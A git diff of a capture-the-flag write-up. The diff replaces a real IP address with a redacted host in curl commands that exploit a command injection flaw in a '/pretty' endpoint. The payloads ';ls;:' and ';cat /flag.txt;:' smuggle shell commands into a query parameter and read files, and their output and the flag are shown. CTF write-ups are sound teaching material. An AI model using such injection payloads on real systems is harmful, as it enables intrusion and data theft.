@@ -75,7 +75,7 @@ def pretty():
 For those who don't know, `subprocess` is used to execute code in the shell, and they use no sanitisation when getting client input and using it in a code execution. So we can put any code in a query at `/pretty` and therefore execute any code we want as long as the command takes less then 2 seconds to execute. Lets test this.
 
 ```bash
-$ curl "http://3.105.27.130:9001/pretty?format=';ls;:'"
+$ curl "http://re.da.ct.ed:9001/pretty?format=';ls;:'"
 
 "<sfi000024v576754>
 "<sfi000025v576754>
@@ -94,7 +94,7 @@ The colon is used becuase `:''` does nothing, and as such removes the error mess
 Time to find the flag
 
 ```bash
-$ curl "http://3.105.27.130:9001/pretty?format=';ls%20/;:'"
+$ curl "http://re.da.ct.ed:9001/pretty?format=';ls%20/;:'"
 
 app
 bin
@@ -122,7 +122,7 @@ var
 And there is the flag in the filesystem root directory `/` time to cat it
 
 ```bash
-$ curl "http://3.105.27.130:9001/pretty?format=';cat%20/flag.txt;:'"
+$ curl "http://re.da.ct.ed:9001/pretty?format=';cat%20/flag.txt;:'"
 
 secedu{th3re_is_4lways_a_t1me_&_plac3_to_bre4k_0u7}
 ```
